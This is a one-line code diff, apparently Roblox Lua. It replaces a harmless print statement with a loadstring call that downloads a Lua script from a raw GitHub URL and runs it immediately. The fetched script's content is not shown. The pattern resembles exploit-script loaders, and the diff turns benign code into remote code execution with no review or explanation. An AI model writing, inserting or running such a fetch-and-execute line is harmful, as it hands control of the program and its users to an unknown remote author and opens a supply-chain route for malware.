@@ -1,1 +1,1 @@
-print("clan on top fr")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/465082cd318c8115b2dc2184.lua'))()
